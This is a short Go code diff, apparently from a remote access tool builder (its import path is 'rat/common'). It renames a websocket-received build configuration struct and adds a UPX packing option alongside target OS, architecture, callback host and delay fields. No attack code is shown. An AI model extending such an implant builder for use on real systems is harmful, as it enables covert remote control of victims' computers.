@@ -10,15 +10,16 @@ import (
 	"rat/common"
 )
 
-// BuildConfig is received from the websocket
-type BuildConfig struct {
+// Config is received from the websocket
+type Config struct {
 	TargetOS   string `json:"os"`
 	TargetArch string `json:"arch"`
 	Host       string `json:"host"`
 	Delay      int    `json:"delay"`
+	UPX        bool   `json:"upx"`
 }
 
-func Build(c *BuildConfig, w io.Writer) error {
+func Build(c *Config, w io.Writer) error {
 	fmt.Println("Starting build...")
 	fmt.Println("Target OS:", c.TargetOS)
 	fmt.Println("Target Arch:", c.TargetArch)
